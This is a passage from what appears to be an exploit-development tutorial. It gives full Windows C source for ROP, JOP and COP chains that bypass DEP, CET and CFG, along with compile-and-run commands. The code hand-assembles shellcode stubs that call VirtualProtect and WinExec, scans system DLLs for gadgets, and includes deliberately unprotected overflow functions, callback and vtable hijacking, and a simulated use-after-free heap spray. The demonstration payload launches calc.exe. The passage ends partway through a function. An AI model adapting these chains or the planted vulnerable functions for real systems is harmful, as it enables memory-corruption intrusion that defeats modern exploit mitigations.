    printf("[+] ntdll: 0x%p, kernel32: 0x%p\n", hNtdll, hKernel32);
    PVOID vpAddr = ResolveAPI(hKernel32, HashAPI("VirtualProtect"));
    if (!vpAddr) vpAddr = GetProcAddress(hKernel32, "VirtualProtect");
    if (!vpAddr) {
        printf("[-] Failed to get VirtualProtect\n");
        return;
    }
    printf("[+] VirtualProtect: 0x%p\n", vpAddr);
    PBYTE textStart = NULL;
    DWORD textSize = 0;
    if (!GetTextSection(hNtdll, &textStart, &textSize)) {
        printf("[-] Failed to get .text section\n");
        return;
    }
    ROP_GADGET gadgets[100];
    int gadgetCount = 0;
    ScanForROPGadgets(textStart, textSize, (DWORD64)hNtdll, gadgets, &gadgetCount, 100);
    printf("[+] Found %d gadgets\n", gadgetCount);
}

static ULONG_PTR* g_ropChainAddr = NULL;
static size_t g_ropChainSize = 0;
static BOOL g_ropExecuted = FALSE;

static LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    DWORD exCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
    PVOID exAddr = ExceptionInfo->ExceptionRecord->ExceptionAddress;
    PCONTEXT ctx = ExceptionInfo->ContextRecord;

    printf("\n[!] Exception caught by VEH: 0x%08X at 0x%p\n", exCode, exAddr);

    if (exCode == 0xC0000005) {
        printf("[!] ACCESS VIOLATION during ROP execution\n");
        printf("[!] Faulting address: 0x%p\n", exAddr);
        printf("[!] Register state:\n");
        printf("    RAX = 0x%p (VirtualProtect return value)\n", (PVOID)ctx->Rax);
        printf("    RCX = 0x%p\n", (PVOID)ctx->Rcx);
        printf("    RDX = 0x%p\n", (PVOID)ctx->Rdx);
        printf("    R8  = 0x%p\n", (PVOID)ctx->R8);
        printf("    R9  = 0x%p\n", (PVOID)ctx->R9);
        printf("    RSP = 0x%p\n", (PVOID)ctx->Rsp);
        printf("    RIP = 0x%p\n", (PVOID)ctx->Rip);

        if (g_ropChainAddr && exAddr >= (PVOID)g_ropChainAddr[1] &&
            exAddr < (PVOID)((BYTE*)g_ropChainAddr[1] + 0x1000)) {
            printf("[!] Crashed AT shellcode address - VirtualProtect likely failed!\n");
            printf("[!] RAX should be non-zero if VirtualProtect succeeded\n");
            if (ctx->Rax == 0) {
                printf("[!] RAX = 0 means VirtualProtect FAILED\n");
                printf("[!] Possible reasons:\n");
                printf("    - Wrong arguments passed\n");
                printf("    - Stack misalignment\n");
                printf("    - Invalid memory address\n");
            }
        }

        __try {
            BYTE* p = (BYTE*)exAddr;
            printf("    Bytes at fault: %02X %02X %02X %02X\n", p[0], p[1], p[2], p[3]);
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            printf("    Cannot read memory at fault address\n");
        }
    } else if (exCode == 0xC0000096) {
        printf("[!] PRIVILEGED INSTRUCTION - DEP violation\n");
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

#pragma optimize("", off)
__declspec(noinline)
ULONG_PTR GetReturnAddressOffset() {
    volatile char buffer[64];
    ULONG_PTR bufferAddr = (ULONG_PTR)buffer;
    ULONG_PTR rspValue;

    // Get current RSP
    rspValue = (ULONG_PTR)_AddressOfReturnAddress();

    // Calculate offset from buffer start to return address
    ULONG_PTR offset = rspValue - bufferAddr;

    printf("[*] Stack layout analysis:\n");
    printf("    Buffer address: 0x%p\n", (void*)bufferAddr);
    printf("    Return address location: 0x%p\n", (void*)rspValue);
    printf("    Offset from buffer to return address: %lld bytes (0x%llX)\n",
           (long long)offset, (unsigned long long)offset);
    printf("    Return address value: 0x%p\n", *(void**)rspValue);
    printf("\n");

    return offset;
}
#pragma optimize("", on)

// ACTUALLY VULNERABLE FUNCTION - NO PROTECTIONS
#pragma optimize("", off)
#pragma runtime_checks("", off)
__declspec(noinline)
void VulnerableFunction(const char* input, size_t inputLen) {
    char buffer[64];

    // Simple memcpy - the classic buffer overflow
    memcpy(buffer, input, inputLen);

    // Return - should jump to our ROP chain
}
#pragma runtime_checks("", restore)
#pragma optimize("", on)

BOOL BuildAndExecuteROPChain() {
    printf("[*] Building ROP chain...\n");
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    HMODULE hKernel32 = GetModuleByHash(0x84CCAF67);
    if (!hKernel32) hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hNtdll || !hKernel32) {
        printf("[-] Failed to get module handles\n");
        return FALSE;
    }
    PVOID pop_rcx = NULL, pop_rdx = NULL, pop_r8 = NULL, pop_r9 = NULL;
    if (!FindPopGadgetsMultiModule(&pop_rcx, &pop_rdx, &pop_r8, &pop_r9)) {
        printf("[-] Failed to find ROP gadgets\n");
        return FALSE;
    }

    PVOID ret_gadget = NULL;
    PBYTE textStart = NULL;
    DWORD textSize = 0;
    if (GetTextSection(hNtdll, &textStart, &textSize)) {
        for (DWORD i = 0; i < textSize - 1; i++) {
            if (textStart[i] == 0xC3) {
                ret_gadget = textStart + i;
                break;
            }
        }
    }

    printf("[+] Gadgets: rcx=0x%p rdx=0x%p r8=0x%p r9=0x%p ret=0x%p\n",
           pop_rcx, pop_rdx, pop_r8, pop_r9, ret_gadget);

    PVOID pVirtualProtect = ResolveAPI(hKernel32, HashAPI("VirtualProtect"));
    if (!pVirtualProtect) pVirtualProtect = GetProcAddress(hKernel32, "VirtualProtect");
    if (!pVirtualProtect) {
        printf("[-] Failed to resolve VirtualProtect\n");
        return FALSE;
    }

    if (!ResolveHeapAPIs()) {
        printf("[-] Failed to resolve heap APIs\n");
        return FALSE;
    }

    // Allocate shellcode
    SIZE_T totalSize = 0x1000;
    PVOID shellcodeAddr = g_fnVirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcodeAddr) {
        printf("[-] Failed to allocate shellcode memory\n");
        return FALSE;
    }

    PVOID pWinExec = ResolveAPI(hKernel32, HashAPI("WinExec"));
    if (!pWinExec) pWinExec = GetProcAddress(hKernel32, "WinExec");
    if (!pWinExec) {
        printf("[-] Failed to resolve WinExec\n");
        g_fnVirtualFree(shellcodeAddr, 0, MEM_RELEASE);
        return FALSE;
    }

    PVOID pExitProcess = ResolveAPI(hKernel32, HashAPI("ExitProcess"));
    if (!pExitProcess) pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
    if (!pExitProcess) {
        printf("[-] Failed to resolve ExitProcess\n");
        g_fnVirtualFree(shellcodeAddr, 0, MEM_RELEASE);
        return FALSE;
    }

    char *cmdString = (char*)((BYTE*)shellcodeAddr + 0x100);
    strcpy(cmdString, "calc.exe");

    BYTE shellcode[] = {
        0x53,                                           // 0: push rbx (save RBX)
        0x48, 0x89, 0xE3,                               // 1: mov rbx, rsp (save original RSP)
        0x48, 0x83, 0xE4, 0xF0,                         // 4: and rsp, -16 (align RSP to 16)
        0x48, 0x83, 0xEC, 0x40,                         // 8: sub rsp, 0x40 (shadow space, RSP%16==0)
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 12: mov rcx, cmdString (patched)
        0xBA, 0x05, 0x00, 0x00, 0x00,                   // 22: mov edx, 5 (SW_SHOW)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 27: mov rax, WinExec (patched)
        0xFF, 0xD0,                                     // 37: call rax
        0x33, 0xC9,                                     // 39: xor ecx, ecx (exit code 0)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 41: mov rax, ExitProcess (patched)
        0xFF, 0xD0                                      // 51: call rax
    };
    memcpy(shellcodeAddr, shellcode, sizeof(shellcode));
    *(PVOID*)((BYTE*)shellcodeAddr + 14) = cmdString;
    *(PVOID*)((BYTE*)shellcodeAddr + 29) = pWinExec;
    *(PVOID*)((BYTE*)shellcodeAddr + 43) = pExitProcess;

    DWORD* pOldProtect = (DWORD*)g_fnVirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pOldProtect) {
        printf("[-] Failed to allocate oldProtect\n");
        g_fnVirtualFree(shellcodeAddr, 0, MEM_RELEASE);
        return FALSE;
    }

    BYTE* vpStub = (BYTE*)g_fnVirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!vpStub) {
        printf("[-] Failed to allocate stub\n");
        g_fnVirtualFree(shellcodeAddr, 0, MEM_RELEASE);
        g_fnVirtualFree(pOldProtect, 0, MEM_RELEASE);
        return FALSE;
    }

    int stubIdx = 0;
    vpStub[stubIdx++] = 0x53;
    vpStub[stubIdx++] = 0x48; vpStub[stubIdx++] = 0x89; vpStub[stubIdx++] = 0xE3;
    vpStub[stubIdx++] = 0x48; vpStub[stubIdx++] = 0x83; vpStub[stubIdx++] = 0xE4; vpStub[stubIdx++] = 0xF0;
    vpStub[stubIdx++] = 0x48; vpStub[stubIdx++] = 0x83; vpStub[stubIdx++] = 0xEC; vpStub[stubIdx++] = 0x60;
    vpStub[stubIdx++] = 0x48; vpStub[stubIdx++] = 0xB9;
    *(PVOID*)(vpStub + stubIdx) = shellcodeAddr; stubIdx += 8;
    vpStub[stubIdx++] = 0x48; vpStub[stubIdx++] = 0xBA;
    *(ULONG_PTR*)(vpStub + stubIdx) = 0x1000; stubIdx += 8;
    vpStub[stubIdx++] = 0x41; vpStub[stubIdx++] = 0xB8;
    *(DWORD*)(vpStub + stubIdx) = PAGE_EXECUTE_READWRITE; stubIdx += 4;
    vpStub[stubIdx++] = 0x49; vpStub[stubIdx++] = 0xB9;
    *(PVOID*)(vpStub + stubIdx) = pOldProtect; stubIdx += 8;
    vpStub[stubIdx++] = 0x48; vpStub[stubIdx++] = 0xB8;
    *(PVOID*)(vpStub + stubIdx) = pVirtualProtect; stubIdx += 8;
    vpStub[stubIdx++] = 0xFF; vpStub[stubIdx++] = 0xD0;
    vpStub[stubIdx++] = 0x48; vpStub[stubIdx++] = 0x89; vpStub[stubIdx++] = 0xDC;
    vpStub[stubIdx++] = 0x5B;
    vpStub[stubIdx++] = 0x48; vpStub[stubIdx++] = 0xB8;
    *(PVOID*)(vpStub + stubIdx) = shellcodeAddr; stubIdx += 8;
    vpStub[stubIdx++] = 0xFF; vpStub[stubIdx++] = 0xE0;

    printf("[+] Stub: 0x%p (%d bytes), Shellcode: 0x%p, VirtualProtect: 0x%p\n",
           vpStub, stubIdx, shellcodeAddr, pVirtualProtect);

    ULONG_PTR ropChain[32];
    int idx = 0;
    ropChain[idx++] = (ULONG_PTR)vpStub;

    size_t returnAddressOffset = 72;
    size_t ropChainBytes = idx * sizeof(ULONG_PTR);
    size_t totalPayloadSize = returnAddressOffset + ropChainBytes;

    BYTE* payload = (BYTE*)malloc(totalPayloadSize);
    if (!payload) {
        printf("[-] Failed to allocate payload\n");
        g_fnVirtualFree(shellcodeAddr, 0, MEM_RELEASE);
        g_fnVirtualFree(pOldProtect, 0, MEM_RELEASE);
        return FALSE;
    }

    memset(payload, 0x41, returnAddressOffset);
    memcpy(payload + returnAddressOffset, ropChain, ropChainBytes);

    g_ropChainAddr = ropChain;
    g_ropChainSize = idx;

    printf("[*] Payload: %d bytes (72 padding + %d ROP)\n", (int)totalPayloadSize, (int)ropChainBytes);
    printf("[*] Triggering overflow -> stub -> VirtualProtect -> shellcode\n");

    // Set up vectored exception handler to catch any crashes
    PVOID vehHandle = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)VectoredHandler);

    VulnerableFunction((const char*)payload, totalPayloadSize);

    printf("[!] Returned normally - check if calc.exe spawned\n");

    if (vehHandle) RemoveVectoredExceptionHandler(vehHandle);
    free(payload);
    Sleep(2000);

    g_fnVirtualFree(vpStub, 0, MEM_RELEASE);
    g_fnVirtualFree(shellcodeAddr, 0, MEM_RELEASE);
    g_fnVirtualFree(pOldProtect, 0, MEM_RELEASE);
    return TRUE;
}

int main() {
    if (!ExploitInitialize(FALSE)) return 1;
    srand((unsigned int)time(NULL));
    printf("=== VirtualProtect ROP Chain (DEP Bypass) ===\n");
    find_gadgets();
    printf("[*] Executing ROP chain...\n");
    if (BuildAndExecuteROPChain()) {
        printf("[+] Completed - check for calc.exe\n");
    } else {
        printf("[-] Failed\n");
    }
    printf("[!] Note: CET systems block ROP - use JOP/COP instead\n");
    return 0;
}
```

**Compile & Run:**

```bash
cl src\virtualprotect_rop.c /Fe:bin\rop_demo.exe advapi32.lib /GS- /I.\headers
.\bin\rop_demo.exe
```

### JOP (Jump-Oriented Programming)

Jump-Oriented Programming chains together code gadgets connected by indirect `JMP` instructions instead of `RET`. The key technique demonstrated in `jop_cet_bypass.c` is using `PUSH return_addr; JMP target` — the `PUSH` manually places a return address on the data stack, then `JMP` transfers control without creating a shadow stack entry. When the target function executes `RET`, it pops from the data stack (which matches the shadow stack entry from a previous legitimate `CALL`), so CET validation passes.

**Platform Differences**:

- **Windows CFG**: Coarse-grained bitmap validation — any valid function start is allowed, so JOP gadgets within valid functions pass CFG checks
- **Linux IBT**: Indirect jumps must land on `ENDBR64` instructions, making JOP harder but not impossible (ENDBR landing sites can still be chained)

```c
// jop_cet_bypass.c
// Jump-Oriented Programming (JOP) for CET bypass
// Compile: cl src\jop_cet_bypass.c /Fe:bin\jop_finder.exe advapi32.lib /GS- /I.\headers

#define SYSCALLS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winternl.h>
#include <time.h>

#include "exploit_common.h"
#include "evasion.h"
#include "bypass.h"
#include "exploit_utils.h"
#include "gadget_finder.h"

#define MAX_JOP_GADGETS 2048
static ROP_GADGET g_jopGadgets[MAX_JOP_GADGETS];
static int g_jopCount = 0;

static void ScanAndReport(HMODULE hMod, const char* modName) {
    PBYTE textStart = NULL;
    DWORD textSize = 0;
    if (!GetTextSection(hMod, &textStart, &textSize)) return;
    int before = g_jopCount;
    ScanForJOPGadgets(textStart, textSize, (DWORD64)hMod,
                      g_jopGadgets, &g_jopCount, MAX_JOP_GADGETS);
    printf("[+] %s: %d JOP gadgets (.text: 0x%X bytes)\n",
           modName, g_jopCount - before, textSize);
}

static PVOID FindGadgetByBytes(BYTE b0, BYTE b1) {
    for (int i = 0; i < g_jopCount; i++)
        if (g_jopGadgets[i].bytes[0] == b0 && g_jopGadgets[i].bytes[1] == b1)
            return (PVOID)g_jopGadgets[i].address;
    return NULL;
}

typedef struct _VULNERABLE_OBJECT {
    char buffer[64];
    PVOID callback;
    DWORD id;
} VULNERABLE_OBJECT;

#pragma optimize("", off)
#pragma runtime_checks("", off)
__declspec(noinline)
static void VulnerableProcess(VULNERABLE_OBJECT* obj, const char* input, size_t len) {
    memcpy(obj->buffer, input, len);

    if (obj->callback) {
        ((void(*)(void))obj->callback)();
    }
}
#pragma runtime_checks("", restore)
#pragma optimize("", on)

static BOOL JOPExploitChain() {
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    PVOID pVP = GetProcAddress(hK32, "VirtualProtect");
    PVOID pWinExec = GetProcAddress(hK32, "WinExec");
    if (!pVP || !pWinExec) return FALSE;

    PVOID jmpRax = FindGadgetByBytes(0xFF, 0xE0);
    if (!jmpRax) {
        printf("[-] No jmp rax gadget found\n");
        return FALSE;
    }

    PVOID scAddr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!scAddr) return FALSE;

    char* cmdStr = (char*)((BYTE*)scAddr + 0x100);
    strcpy(cmdStr, "calc.exe");

    BYTE shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x48, 0xC7, 0xC2, 0x05, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(shellcode + 6) = cmdStr;
    *(PVOID*)(shellcode + 23) = pWinExec;
    memcpy(scAddr, shellcode, sizeof(shellcode));

    BYTE* jopStub = (BYTE*)VirtualAlloc(NULL, 0x100, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!jopStub) {
        VirtualFree(scAddr, 0, MEM_RELEASE);
        return FALSE;
    }

    DWORD* pOldProtect = (DWORD*)VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!pOldProtect) {
        VirtualFree(scAddr, 0, MEM_RELEASE);
        VirtualFree(jopStub, 0, MEM_RELEASE);
        return FALSE;
    }

    int idx = 0;
    // Save and align stack
    jopStub[idx++] = 0x53;                                          // push rbx
    jopStub[idx++] = 0x48; jopStub[idx++] = 0x89; jopStub[idx++] = 0xE3;  // mov rbx, rsp
    jopStub[idx++] = 0x48; jopStub[idx++] = 0x83; jopStub[idx++] = 0xE4; jopStub[idx++] = 0xF0;  // and rsp, -16
    jopStub[idx++] = 0x48; jopStub[idx++] = 0x83; jopStub[idx++] = 0xEC; jopStub[idx++] = 0x60;  // sub rsp, 0x60

    // Load VirtualProtect args
    jopStub[idx++] = 0x48; jopStub[idx++] = 0xB9;  // mov rcx, scAddr
    *(PVOID*)(jopStub + idx) = scAddr; idx += 8;
    jopStub[idx++] = 0x48; jopStub[idx++] = 0xBA;  // mov rdx, 0x1000
    *(ULONG_PTR*)(jopStub + idx) = 0x1000; idx += 8;
    jopStub[idx++] = 0x41; jopStub[idx++] = 0xB8;  // mov r8d, PAGE_EXECUTE_READ
    *(DWORD*)(jopStub + idx) = PAGE_EXECUTE_READ; idx += 4;
    jopStub[idx++] = 0x49; jopStub[idx++] = 0xB9;  // mov r9, pOldProtect
    *(PVOID*)(jopStub + idx) = pOldProtect; idx += 8;

    // Load VirtualProtect address into RAX and CALL it
    jopStub[idx++] = 0x48; jopStub[idx++] = 0xB8;  // mov rax, VirtualProtect
    *(PVOID*)(jopStub + idx) = pVP; idx += 8;
    jopStub[idx++] = 0xFF; jopStub[idx++] = 0xD0;  // call rax

    // VirtualProtect returns BOOL in EAX (0 = failure, non-zero = success)
    // Store result for debugging
    jopStub[idx++] = 0x48; jopStub[idx++] = 0xA3;  // mov [result_addr], rax
    *(PVOID*)(jopStub + idx) = (PVOID)((BYTE*)pOldProtect + 8); idx += 8;  // Store at pOldProtect+8

    // Check if VirtualProtect succeeded (RAX should be non-zero)
    jopStub[idx++] = 0x48; jopStub[idx++] = 0x85; jopStub[idx++] = 0xC0;  // test rax, rax
    jopStub[idx++] = 0x74; jopStub[idx++] = 0x0D;  // jz skip_shellcode (jump 13 bytes forward)

    // Restore stack
    jopStub[idx++] = 0x48; jopStub[idx++] = 0x89; jopStub[idx++] = 0xDC;  // mov rsp, rbx
    jopStub[idx++] = 0x5B;  // pop rbx

    // Load shellcode address into RAX and JMP to it (JOP!)
    jopStub[idx++] = 0x48; jopStub[idx++] = 0xB8;  // mov rax, shellcode
    *(PVOID*)(jopStub + idx) = scAddr; idx += 8;
    jopStub[idx++] = 0xFF; jopStub[idx++] = 0xE0;  // jmp rax (JOP - no shadow stack entry!)

    // skip_shellcode: restore and return
    jopStub[idx++] = 0x48; jopStub[idx++] = 0x89; jopStub[idx++] = 0xDC;  // mov rsp, rbx
    jopStub[idx++] = 0x5B;  // pop rbx
    jopStub[idx++] = 0xC3;  // ret

    printf("[+] Shellcode: 0x%p, VirtualProtect: 0x%p, jmp rax: 0x%p\n",
           scAddr, pVP, jmpRax);
    printf("[+] JOP stub: 0x%p (%d bytes)\n", jopStub, idx);

    DWORD testOld = 0;
    if (!VirtualProtect(scAddr, 0x1000, PAGE_EXECUTE_READ, &testOld)) {
        printf("[-] VirtualProtect test failed\n");
        VirtualFree(scAddr, 0, MEM_RELEASE);
        VirtualFree(jopStub, 0, MEM_RELEASE);
        VirtualFree(pOldProtect, 0, MEM_RELEASE);
        return FALSE;
    }
    DWORD dummy;
    VirtualProtect(scAddr, 0x1000, PAGE_READWRITE, &dummy);

    printf("\n[*] Step 4: Exploiting buffer overflow to hijack control flow\n");

    VULNERABLE_OBJECT* victim = (VULNERABLE_OBJECT*)malloc(sizeof(VULNERABLE_OBJECT));
    if (!victim) {
        VirtualFree(scAddr, 0, MEM_RELEASE);
        VirtualFree(jopStub, 0, MEM_RELEASE);
        VirtualFree(pOldProtect, 0, MEM_RELEASE);
        return FALSE;
    }

    // Initialize with legitimate callback
    victim->callback = (PVOID)GetTickCount;
    victim->id = 0x12345678;

    printf("[+] Victim: 0x%p, callback: 0x%p -> 0x%p (hijacked)\n",
           victim, victim->callback, jopStub);

    BYTE payload[128];
    memset(payload, 0x41, 64);
    *(PVOID*)(payload + 64) = jopStub;
    *(DWORD*)(payload + 72) = 0xDEADBEEF;

    printf("[*] Triggering overflow (%zu bytes) -> JOP stub -> VirtualProtect -> shellcode\n",
           sizeof(payload));

    BOOL success = FALSE;
    __try {
        VulnerableProcess(victim, (const char*)payload, sizeof(payload));

        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(scAddr, &mbi, sizeof(mbi))) {
            if (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) {
                printf("[+] VirtualProtect succeeded (0x%X), shellcode executed\n", mbi.Protect);
                success = TRUE;
            } else {
                printf("[-] VirtualProtect failed (protection: 0x%X)\n", mbi.Protect);
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception: 0x%08X\n", GetExceptionCode());
        free(victim);
        VirtualFree(scAddr, 0, MEM_RELEASE);
        VirtualFree(jopStub, 0, MEM_RELEASE);
        VirtualFree(pOldProtect, 0, MEM_RELEASE);
        return FALSE;
    }

    Sleep(2000);  // Give calc.exe time to spawn
    free(victim);
    VirtualFree(jopStub, 0, MEM_RELEASE);
    VirtualFree(scAddr, 0, MEM_RELEASE);
    VirtualFree(pOldProtect, 0, MEM_RELEASE);
    return success;
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    srand((unsigned int)time(NULL));
    printf("=== JOP CET Bypass: Gadget Discovery + Exploit Chain ===\n\n");

    printf("[*] Phase 1: Scanning for JOP gadgets\n");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    HMODULE hKBase = GetModuleHandleA("kernelbase.dll");
    if (hNtdll) ScanAndReport(hNtdll, "ntdll.dll");
    if (hK32)   ScanAndReport(hK32, "kernel32.dll");
    if (hKBase)  ScanAndReport(hKBase, "kernelbase.dll");
    printf("[+] Total: %d JOP gadgets\n", g_jopCount);

    printf("\n[*] Phase 2: Key gadgets\n");
    PVOID jmpRax  = FindGadgetByBytes(0xFF, 0xE0);
    PVOID callRax = FindGadgetByBytes(0xFF, 0xD0);
    if (jmpRax)  printf("[+] jmp rax: 0x%p\n", jmpRax);
    if (callRax) printf("[+] call rax: 0x%p\n", callRax);

    if (jmpRax) {
        printf("\n[*] Phase 3: JMP gadgets accessible in system DLLs\n");
    }

    printf("\n[*] Phase 4: Buffer overflow -> callback hijack -> JOP\n");
    fflush(stdout);

    if (JOPExploitChain()) {
        printf("\n[+] Exploit complete - calc.exe launched via JOP chain\n");
    } else {
        printf("\n[-] Exploit failed\n");
    }

    printf("\n=== CET Analysis ===\n");
    printf("[*] JMP bypasses shadow stack (no return address pushed)\n");
    printf("[*] System DLL gadgets %s\n",
           jmpRax ? "accessible (IBT not enforced)" : "blocked by IBT");

    return 0;
}
```

**Compile & Run:**

```bash
cl src\jop_cet_bypass.c /Fe:bin\jop_finder.exe advapi32.lib /GS- /I.\headers
.\bin\jop_finder.exe
```

> [!NOTE]: Gadget addresses vary per boot due to ASLR.
> In practice, use tools like ROPgadget for comprehensive JOP gadget enumeration.
> Building a functional JOP exploit chain requires a vulnerability to trigger the first gadget.

### COP (Call-Oriented Programming)

Call-Oriented Programming uses indirect `CALL` instructions to chain gadgets. Unlike traditional ROP which corrupts return addresses (detected by CET), COP uses legitimate `CALL` instructions that create matching shadow stack entries. The shadow stack sees a legitimate `CALL`/`RET` pair even though the attacker controls which function is called. The attack leverages "call-site gadgets" that perform useful operations before making another indirect call.

**Platform Differences**:

- **Windows CFG**: Called targets only need to be in the CFG bitmap (any valid function entry point qualifies)
- **Linux IBT**: Indirect calls must land on `ENDBR64` instructions

COP is particularly effective against Windows CFG because it uses legitimate function calls that pass bitmap validation. The code in `cop_chain_builder.c` demonstrates vtable hijacking where the attacker replaces vtable entries with addresses of legitimate system functions (like `VirtualProtect`, `WinExec`) — all CFG-valid targets.

```c
// cop_chain_builder.c
// Call-Oriented Programming: CET bypass via vtable hijack + exploit chain
// Compile: cl src\cop_chain_builder.c /Fe:bin\cop_chain.exe /I.\headers

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winternl.h>
#include <time.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include "exploit_common.h"
#include "exploit_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "gadget_finder.h"

typedef DWORD64 (*ObjMethod)(void* self);

typedef struct _VictimVtable {
    ObjMethod GetId;
    ObjMethod GetData;
    ObjMethod Process;
    ObjMethod Cleanup;
} VictimVtable;

typedef struct _VictimObject {
    VictimVtable* vtable;
    DWORD64 id;
    DWORD64 data;
    PVOID buffer;
    DWORD64 cookie;
} VictimObject;

static DWORD64 Victim_GetId(void* self)   { return ((VictimObject*)self)->id; }
static DWORD64 Victim_GetData(void* self) { return ((VictimObject*)self)->data; }
static DWORD64 Victim_Process(void* self) { return ((VictimObject*)self)->id + ((VictimObject*)self)->data; }
static DWORD64 Victim_Cleanup(void* self) { ((VictimObject*)self)->data = 0; return 1; }

static VictimVtable g_legitVtable = {
    Victim_GetId, Victim_GetData, Victim_Process, Victim_Cleanup
};

static VictimObject* CreateVictimObject(DWORD64 id, DWORD64 data) {
    VictimObject* obj = (VictimObject*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VictimObject));
    if (!obj) return NULL;
    obj->vtable = &g_legitVtable;
    obj->id = id;
    obj->data = data;
    obj->cookie = 0xDEADC0DE;
    return obj;
}

#pragma optimize("", off)
#pragma runtime_checks("", off)
__declspec(noinline)
static void VulnerableObjectProcessor(VictimObject* obj, const char* input, size_t len) {
    char buffer[64];
    VictimObject* savedObj = obj;
    memcpy(buffer, input, len);

    if (savedObj && savedObj->vtable) {
        printf("[*] Calling vtable->Process() on object at 0x%p\n", savedObj);
        savedObj->vtable->Process(savedObj);
    }
}
#pragma runtime_checks("", restore)
#pragma optimize("", on)

static LONG WINAPI COPExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    DWORD exCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
    PVOID exAddr = ExceptionInfo->ExceptionRecord->ExceptionAddress;
    PCONTEXT ctx = ExceptionInfo->ContextRecord;

    printf("\n[!] Exception caught: 0x%08X at 0x%p\n", exCode, exAddr);

    if (exCode == 0xC0000005) {
        printf("[!] ACCESS VIOLATION during COP execution\n");
        printf("[!] Register state:\n");
        printf("    RAX = 0x%p\n", (PVOID)ctx->Rax);
        printf("    RCX = 0x%p\n", (PVOID)ctx->Rcx);
        printf("    RIP = 0x%p\n", (PVOID)ctx->Rip);
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

static BOOL UAFVtableHijack() {
    VictimObject* obj = CreateVictimObject(42, 100);
    if (!obj) return FALSE;

    DWORD64 legitId = obj->vtable->GetId(obj);
    printf("[+] Legitimate vtable call: GetId() = %llu\n", legitId);

    printf("[*] Simulating UAF: freeing object at 0x%p\n", obj);
    HeapFree(GetProcessHeap(), 0, obj);

    VictimObject* spray[16];
    for (int i = 0; i < 16; i++) {
        spray[i] = (VictimObject*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VictimObject));
    }

    VictimObject* reclaimed = NULL;
    for (int i = 0; i < 16; i++) {
        if (spray[i] == obj) {
            reclaimed = spray[i];
            printf("[+] Reclaimed SAME address (UAF exploitable!)\n");
            break;
        }
    }

    if (!reclaimed) {
        reclaimed = spray[0];
        printf("[+] Reclaimed different address (simulating UAF)\n");
    }

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    VictimVtable fakeVtable;
    fakeVtable.GetId   = (ObjMethod)GetProcAddress(hK32, "GetCurrentProcessId");
    fakeVtable.GetData = (ObjMethod)GetProcAddress(hK32, "GetCurrentThreadId");
    fakeVtable.Process = (ObjMethod)GetProcAddress(hK32, "GetTickCount");
    fakeVtable.Cleanup = (ObjMethod)GetProcAddress(hK32, "GetTickCount");

    reclaimed->vtable = &fakeVtable;
    reclaimed->cookie = 0xC0FFEE;

    VictimObject* dangling = (reclaimed == obj) ? obj : reclaimed;

    __try {
        DWORD64 pid = dangling->vtable->GetId(dangling);
        DWORD64 tid = dangling->vtable->GetData(dangling);
        printf("[+] Hijacked vtable: PID=%llu, TID=%llu\n", pid, tid);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception during vtable dispatch\n");
        for (int i = 0; i < 16; i++) HeapFree(GetProcessHeap(), 0, spray[i]);
        return FALSE;
    }

    for (int i = 0; i < 16; i++) HeapFree(GetProcessHeap(), 0, spray[i]);
    return TRUE;
}

static BOOL COPExploitChain() {
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    PVOID pVP = GetProcAddress(hK32, "VirtualProtect");
    PVOID pWinExec = GetProcAddress(hK32, "WinExec");
    if (!pVP || !pWinExec) return FALSE;

    // Allocate shellcode memory
